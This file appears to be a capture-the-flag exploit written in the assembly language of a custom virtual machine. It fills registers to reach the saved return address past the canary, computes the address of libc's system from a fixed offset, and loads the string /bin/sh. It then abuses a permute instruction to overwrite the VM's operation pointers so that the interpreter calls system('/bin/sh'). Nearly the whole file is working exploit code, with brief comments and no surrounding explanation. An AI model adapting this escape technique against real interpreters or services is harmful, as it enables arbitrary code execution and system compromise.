; setup pregs at the end of memory so r0 is saved

li r1 0x7fff
li r2 0
st8 r1 r2 0

li r2 2
li r3 3
li r4 4
li r5 5
li r6 6
li r7 7
li r8 8
li r9 9
li r10 10
li r11 11
li r12 12
li r13 13
li r14 14
li r15 15
li r16 16
li r17 17
li r18 18
li r19 19
li r20 20
li r21 21
li r22 22
li r23 23
li r24 24
li r25 25
li r26 26
li r27 27
li r28 28
li r29 29
li r30 30
li r31 31
li r32 32
li r33 33
li r34 34
li r35 35
li r36 36
li r37 37
li r38 38
li r39 39
li r40 40
li r41 41
li r42 42
li r43 43
li r44 44
li r45 45
li r46 46
li r47 47
li r48 48
li r49 49
li r50 50
li r51 51
li r52 52
li r53 53
li r54 54
li r55 55
li r56 56
li r57 57
li r58 58
li r59 59
li r60 60
li r61 61
li r62 62
li r63 63
li r64 64
li r65 65
li r66 66
li r67 67
li r68 68
li r69 69
li r70 70
li r71 71
li r72 72
li r73 73
li r74 74
li r75 75
li r76 76
li r77 77
li r78 78
li r79 79
li r80 80
li r81 81
li r82 82
li r83 83
li r84 84
li r85 85
li r86 86
li r87 87
li r88 88
li r89 89
li r90 90
li r91 91
li r92 92
li r93 93
li r94 94
li r95 95
li r96 96
li r97 97
li r98 98
li r99 99
li r100 100
li r101 101
li r102 102
li r103 103
li r104 104
li r105 105
li r106 106
li r107 107
li r108 108
li r109 109
li r110 110
li r111 111
li r112 112
li r113 113
li r114 114
li r115 115
li r116 116
li r117 117
li r118 118
li r119 119
li r120 120
li r121 121
li r122 122
li r123 123
li r124 124
li r125 125
li r126 126
li r127 127
li r128 128
li r129 129
li r130 130
li r131 131
li r132 132
li r133 133
li r134 134
li r135 135
li r136 136
li r137 137
li r138 138
li r139 139
li r140 140
li r141 141
li r142 142
li r143 143
li r144 144
li r145 145
li r146 146
li r147 147
li r148 148
li r149 149
li r150 150
li r151 151
li r152 152
li r153 153
li r154 154
li r155 155
li r156 156
li r157 157
li r158 158
li r159 159
li r160 160
li r161 161
li r162 162
li r163 163
li r164 164
li r165 165
li r166 166
li r167 167
li r168 168
li r169 169
li r170 170
li r171 171
li r172 172
li r173 173
li r174 174
li r175 175
li r176 176
li r177 177
li r178 178
li r179 179
li r180 180
li r181 181
li r182 182
li r183 183
li r184 184
li r185 185
li r186 186
li r187 187
li r188 188
li r189 189
li r190 190
li r191 191
li r192 192
li r193 193
li r194 194
li r195 195
li r196 196
li r197 197
li r198 198
li r199 199
li r200 200
li r201 201
li r202 202
li r203 203
li r204 204
li r205 205
li r206 206
li r207 207
li r208 208
li r209 209
li r210 210
li r211 211
li r212 212
li r213 213
li r214 214
li r215 215
li r216 216
li r217 217
li r218 218
li r219 219
li r220 220
li r221 221
li r222 222
li r223 223
li r224 224
li r225 225
li r226 226
li r227 227
li r228 228
li r229 229
li r230 230
li r231 231
li r232 232
li r233 233
li r234 234
li r235 235
li r236 236
li r237 237
li r238 238
li r239 239
li r240 240
li r241 241
li r242 242
li r243 243
li r244 244
li r245 245
li r246 246
li r247 247
li r248 248
li r249 249
li r250 250
li r251 251
li r252 252
li r253 253
li r254 254
li r255 255

; 1 register is r0, 8 are canary, 8 are return address
; r17-r24 is return address to libc
pregs 64 r1

cmpi r2 r17 255
jle r2 .skip1
li r17 0
.skip1:
cmpi r2 r18 255
jle r2 .skip2
li r18 0
.skip2:
cmpi r2 r19 255
jle r2 .skip3
li r19 0
.skip3:
cmpi r2 r20 255
jle r2 .skip4
li r20 0
.skip4:
cmpi r2 r21 255
jle r2 .skip5
li r21 0
.skip5:
cmpi r2 r22 255
jle r2 .skip6
li r22 0
.skip6:
cmpi r2 r23 255
jle r2 .skip7
li r23 0
.skip7:
cmpi r2 r24 255
jle r2 .skip8
li r24 0
.skip8:

addi r1 r17 0
shli r18 r18 8
or r1 r1 r18
shli r19 r19 16
or r1 r1 r19
shli r20 r20 24
or r1 r1 r20
shli r21 r21 32
or r1 r1 r21
shli r22 r22 40
or r1 r1 r22
shli r23 r23 48
or r1 r1 r23
shli r24 r24 56
or r1 r1 r24

; offset from main return to system: 0x2e20d = system - ret_addr
li r2 0xe20d
li16 r2 0x2
; r2 = 0x2e20d
add r1 r1 r2
; r1 now has address of system

; put /bin/sh\0 in r2
li r2 0x622f
li16 r2 0x6e69
li32 r2 0x732f
li48 r2 0x68

; when this permute happens, we will put /bin/sh\0 in the first op pointer
; and pointer to system in second op pointer
; now if we call second op pointer it is passed Vm *vm as first argument, and
; the first op is first element in Vm struct, so we call system("/bin/sh")
li r3 abs:op_perm_data

pops 0 r3 0

; this will call system
ld 0 0 0

exit

op_perm_data:
; offset until registers: 87
.bytes [93 92 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38]
